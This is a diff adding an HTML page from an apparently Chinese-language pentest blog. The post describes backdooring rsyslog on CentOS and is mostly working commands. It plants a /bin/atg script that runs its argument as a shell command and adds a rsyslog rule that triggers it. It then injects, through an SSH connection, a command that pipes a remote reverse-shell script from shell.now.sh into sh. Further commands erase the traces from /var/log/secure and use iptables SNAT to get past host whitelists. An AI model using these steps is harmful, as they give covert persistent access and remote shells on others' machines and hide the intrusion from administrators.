@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>Rsyslog Backdoor</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Study The World </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/rsyslog-backdoor.html" rel="bookmark"
+           title="Permalink to Rsyslog Backdoor">Rsyslog Backdoor</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2019-07-21T00:00:00+02:00">
+                <a href='#'>07/21/2019 </a>
+                <a href="/category/pentest.html">Pentest</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <p>Centos自带rsyslog，网上有具体利用过程，这里我记录下简单的坑。</p>
+<h3>建立</h3>
+<div class="highlight"><pre><span></span><span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;#!/bin/sh\nsh -c &quot;$1&quot;&#39;</span><span class="o">&gt;/</span><span class="n">bin</span><span class="o">/</span><span class="n">atg</span>
+<span class="n">chmod</span> <span class="mi">755</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">atg</span>
+
+<span class="n">echo</span> <span class="ss">&quot;auth.*,regex, abcd  ^/bin/atg&quot;</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">rsyslog</span><span class="p">.</span><span class="n">d</span><span class="o">/</span><span class="n">README</span><span class="p">.</span><span class="n">conf</span>
+
+<span class="err">重启生效</span><span class="p">(</span><span class="n">Centos用下面的systemctl</span><span class="p">):</span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">init</span><span class="p">.</span><span class="n">d</span><span class="o">/</span><span class="n">rsyslog</span> <span class="k">restart</span>
+<span class="n">systemctl</span> <span class="k">restart</span> <span class="n">rsyslog</span>
+</pre></div>
+
+
+<h3>利用:</h3>
+<div class="highlight"><pre><span></span><span class="nt">echo</span> <span class="s2">&quot;xxxxx&#39;;curl https://shell.now.sh/127.0.0.1:1337 | sh;&#39;&quot;</span><span class="o">|</span><span class="nt">socat</span> <span class="nt">STDIO</span> <span class="nt">TCP4</span><span class="p">:</span><span class="nd">127</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">1</span><span class="p">:</span><span class="nd">22</span>
+</pre></div>
+
+
+<h3>擦屁股:</h3>
+<div class="highlight"><pre><span></span><span class="n">sed</span> <span class="o">-</span><span class="n">i</span> <span class="s1">&#39;/xxxxx/d&#39;</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">secure</span>
+<span class="n">kill</span> <span class="o">-</span><span class="mi">9</span> <span class="err">$$</span> 
+</pre></div>
+
+
+<h3>注意事项</h3>
+<p>如果主机设定了<code>hosts.allow</code>的情况下，利用的那一部分是无法成功的，因为这个ssh的日志不会被记录。所以咧我们可以利用iptables. :)</p>
+<div class="highlight"><pre><span></span><span class="n">iptables</span> <span class="o">-</span><span class="n">t</span> <span class="n">nat</span> <span class="o">-</span><span class="n">A</span> <span class="k">INPUT</span> <span class="o">-</span><span class="n">p</span> <span class="n">tcp</span> <span class="o">-</span><span class="n">d</span> <span class="o">&lt;</span><span class="err">受害主机</span><span class="o">&gt;</span> <span class="c1">--dport 22 -s &lt;攻击主机&gt; -j SNAT --to-source &lt;ip白名单的地址&gt;</span>
+</pre></div>
+
+
+<p>然后呢，iptables得开机启动，并且加载这个规则:</p>
+<div class="highlight"><pre><span></span><span class="n">systemctl</span> <span class="n">disable</span> <span class="n">firewalld</span>  <span class="o">//</span><span class="err">在</span><span class="n">centos7</span> <span class="err">上面防火墙改成这个了</span>
+<span class="n">yum</span> <span class="n">install</span> <span class="n">iptables</span><span class="o">-</span><span class="n">services</span>   <span class="o">//</span> <span class="err">以防万一</span>
+<span class="n">systemctl</span> <span class="n">enable</span> <span class="n">iptables</span>
+<span class="n">systemctl</span> <span class="k">start</span> <span class="n">iptables</span>    <span class="o">//</span><span class="err">启动</span>
+<span class="n">systemctl</span> <span class="n">status</span> <span class="n">iptables</span>  <span class="o">//</span><span class="err">查看状态</span>
+<span class="n">service</span> <span class="n">iptables</span> <span class="n">save</span>   <span class="o">//</span><span class="err">设定好规则之后，重启也会生效。</span>
+</pre></div>
+
+
+<ul>
+<li><a href="https://www.jakoblell.com/blog/2014/05/07/hacking-contest-backdooring-rsyslogd/">https://www.jakoblell.com/blog/2014/05/07/hacking-contest-backdooring-rsyslogd/</a></li>
+</ul>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
